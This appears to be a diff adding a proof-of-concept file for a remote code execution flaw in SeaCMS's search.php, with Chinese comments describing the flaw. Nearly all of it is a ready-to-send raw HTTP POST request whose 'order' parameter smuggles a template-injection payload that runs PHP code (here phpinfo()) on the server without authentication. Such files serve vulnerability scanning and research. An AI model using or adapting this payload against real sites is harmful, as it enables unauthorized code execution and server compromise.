@@ -1,0 +1,10 @@
+# SeaCMS search.php 远程命令执行漏洞
+# SeaCMS中的漏洞允许未经身份验证的远程攻击者执行任意PHP代码。
+POST /search.php?acid=80000911&bid=hd_tag_m8mv25yt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25yt
+RM-PRO-Token: aa19fb1d31335054d41f6dec83e609d6
+RM-PRO-Time: 1742808514434
+User-Agent: curl/7.83.1
+
+searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if}
